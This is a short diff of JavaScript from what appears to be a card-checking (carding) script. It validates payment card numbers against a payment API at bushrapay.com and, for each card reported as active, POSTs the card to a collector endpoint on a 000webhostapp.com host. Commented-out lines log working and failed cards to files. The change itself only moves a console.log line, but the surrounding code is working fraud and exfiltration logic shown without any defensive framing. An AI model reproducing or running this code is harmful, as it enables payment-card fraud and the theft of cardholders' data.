@@ -117,6 +117,7 @@ fetch('https://app.bushrapay.com/API/do/Trans', {
   //console.log(data) 
   if(data.Status == true){ 
 //fs.appendFile("live.txt",card+"\n",function (err) {if (err) throw err;console.log('Success! '+card);}); 
+console.log(card) 
  fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
     method: 'POST',
 
@@ -131,7 +132,6 @@ fetch('https://app.bushrapay.com/API/do/Trans', {
 {"id":card}
 )
 })
-console.log(card) 
   }else if(data.Status == false){ 
 //fs.appendFile("error.txt","["+i+"]"+card+"\n",function (err) {if (err) throw err;}); 
 //console.log("not Active") 
